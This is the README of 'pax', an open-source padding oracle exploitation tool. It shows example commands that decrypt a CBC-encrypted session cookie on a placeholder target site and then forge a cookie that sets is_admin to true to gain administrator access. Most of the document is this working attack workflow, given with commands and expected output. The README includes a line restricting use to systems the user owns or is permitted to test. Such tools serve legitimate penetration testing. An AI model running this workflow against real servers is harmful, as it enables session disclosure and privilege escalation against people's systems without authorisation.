# pax

[![Travis Build Status](https://travis-ci.org/liamg/pax.svg?branch=master)](https://travis-ci.org/liamg/pax)
[![GoReportCard](https://goreportcard.com/badge/github.com/liamg/pax)](https://goreportcard.com/report/github.com/liamg/pax)

Exploit padding oracles for fun and profit!

Pax (PAdding oracle eXploiter) is a tool for exploiting padding oracles in order to:

1. Obtain plaintext for a given piece of CBC encrypted data.
2. Obtain encrypted bytes for a given piece of plaintext, using the unknown encryption algorithm used by the oracle.

This can be used to disclose encrypted session information, and often to bypass authentication, by encrypting custom plaintext and writing it back to the server. 

As always, this tool should only be used on systems you own and/or have permission to probe!

## Example Usage

If you find a suspected oracle, where the encrypted data is stored inside a cookie named `SESS`, you can use the following:

```bash
pax decrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D"
```

This will hopefully give you some plaintext, perhaps something like:

```bash
 {"user_id": 456, "is_admin": false}
```

It looks like you could elevate your privileges here!

We can attempt to do so by first generating our own encrypted data that the oracle will decrypt back to some sneaky plaintext:

```bash
pax encrypt --url https://target.site/profile.php --sample Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D --block-size 16 --cookies "SESS=Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg%3D%3D" --plain-text '{"user_id": 456, "is_admin": true}'
```

This will spit out another base64 encoeed set of encrypted data, perhaps something like:

```
dGhpcyBpcyBqdXN0IGFuIGV4YW1wbGU=
```

Now we open our browser and set the value of the `SESS` cookie to the above value. Loading the original oracle page we should now see we are elevated to admin. 

## How does this work?

The following are great guides on how this attack works:

- https://robertheaton.com/2013/07/29/padding-oracle-attack/
- https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth
